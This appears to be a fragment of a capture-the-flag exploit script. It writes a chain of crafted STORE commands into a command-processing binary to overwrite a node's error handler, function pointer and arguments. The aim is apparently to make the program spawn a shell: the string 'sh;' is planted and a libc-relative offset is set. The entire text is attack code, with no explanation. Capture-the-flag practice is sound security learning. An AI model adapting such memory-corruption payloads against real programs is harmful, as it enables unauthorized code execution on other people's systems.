error_handler =0x60
cur_cmd =0x64
nb_cmd =0x68
next_node=0x6c
err_callback=0x70 
func=0x78
arg1_type=0x80 
arg1_val =0x88

add(1,1,2,command,1)
command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(0x58) #value arg1
command += p64(CONSTANT) #type of arg2
command += p32(0x61) #value arg2
add(2,1,3,command,1)
command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(error_handler) #value arg1
command += p64(CONSTANT) #type of arg2
command += p32(0x003B6873) #value arg2
add(3,1,4,command,1)

command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(cur_cmd) #value arg1
command += p64(CONSTANT) #type of arg2
command += p32(0) #value arg2
add(4,1,5,command,1) 


command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(nb_cmd) #value arg1
command += p64(CONSTANT) #type of arg2
command += p32(1) #value arg2
add(5,1,6,command,1)

command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(next_node) #value arg1
command += p64(CONSTANT) #type of arg2
command += p32(0) #value arg2
add(6,1,7,command,1)


command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(func) #value arg1
command += p64(CONSTANT) #type of arg2
command += p32(SUBTRACT) #value arg2
add(7,1,8,command,1)

command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(func) #value arg1
command += p64(CONSTANT) #type of arg2
command += p32(ADD) #value arg2
add(8,1,9,command,1)

command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(arg1_type) #value arg1
command += p64(CONSTANT) #type of arg2
command += p32(CONSTANT) #value arg2
add(9,1,10,command,1)

command = p64(STORE) #func
command += p64(MEM) #type of arg1
command += p64(arg1_val) #value arg1
command += p64(CONSTANT) #type of arg2
command += p64(0xffffffffffe37080) #value arg2
add(10,1,0,command,1)



